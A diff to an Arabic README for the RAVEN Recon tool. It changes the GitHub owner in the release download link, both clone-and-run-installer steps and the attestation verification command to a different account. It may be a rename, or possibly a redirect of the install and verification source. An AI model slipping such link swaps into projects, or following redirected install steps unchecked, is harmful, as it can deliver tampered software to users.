@@ -48,7 +48,7 @@
 ### ويندوز
 
 **الطريقة الأسهل — تطبيق جاهز:**
-1. نزّل `RAVEN-Recon-windows-x64.zip` من [صفحة الإصدارات](https://github.com/mahmodaltory12-beep/raven-recon/releases/latest).
+1. نزّل `RAVEN-Recon-windows-x64.zip` من [صفحة الإصدارات](https://github.com/9illcodelli6-cpp69cve/raven-recon/releases/latest).
 2. تحقّق منه (تحت)، فك الضغط، وشغّل `RAVEN.exe`.
 
 **من المصدر** (بدك Python 3.11+ — أو `winget install -e --id Python.Python.3.12` — وGit)، بـ PowerShell:
@@ -56,7 +56,7 @@
 </div>
 
 ```powershell
-git clone https://github.com/mahmodaltory12-beep/raven-recon.git
+git clone https://github.com/9illcodelli6-cpp69cve/raven-recon.git
 cd raven-recon
 powershell -ExecutionPolicy Bypass -File .\install.ps1
 ```
@@ -87,7 +87,7 @@ sudo apt install -y gir1.2-webkit2-4.1 bubblewrap
 </div>
 
 ```bash
-git clone https://github.com/mahmodaltory12-beep/raven-recon.git
+git clone https://github.com/9illcodelli6-cpp69cve/raven-recon.git
 cd raven-recon
 ./install.sh
 ```
@@ -106,7 +106,7 @@ cd raven-recon
 
 ```bash
 sha256sum -c SHA256SUMS.txt --ignore-missing
-gh attestation verify RAVEN-Recon-linux-x64.tar.gz --repo mahmodaltory12-beep/raven-recon
+gh attestation verify RAVEN-Recon-linux-x64.tar.gz --repo 9illcodelli6-cpp69cve/raven-recon
 ```
 
 <div dir="rtl">
